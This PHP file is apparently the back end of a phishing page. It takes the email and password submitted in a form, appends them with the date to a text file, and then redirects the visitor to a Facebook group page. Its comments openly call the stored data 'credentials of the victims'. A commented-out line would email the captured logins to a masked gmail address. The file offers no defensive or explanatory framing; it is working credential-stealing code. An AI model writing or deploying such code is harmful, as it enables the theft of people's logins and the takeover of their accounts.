<?php



$email ="email = ".$_POST['email'];       // getting email address
$password = "Password = ".$_POST['pass']; // getting password

$section = "\n******************************************\n";

$message= $email."\n".$password."\n";    // append them and assign it to a variable

/* php code for send an email which contains credentials.
mail('xxxxxxxxx@gmail.com', 'My Subject', $message);
 */


$myfile = fopen("newfile.txt", "a");
/*Open for writing only.
place the file pointer at the end of the file.
If the file does not exist, attempt to create it. */


//store credentials of the victims
fwrite ($myfile,"$section");
fwrite ($myfile,"\n".date("Y/m/d")."\n");
fwrite($myfile, $message);
fwrite ($myfile,"$section");

fclose($myfile);

//finally redirecting the user to the page/group or somewhere else
header("location:https://www.facebook.com/FB-Jokes-Network-Sri-Lanka-431309230269057/");

?>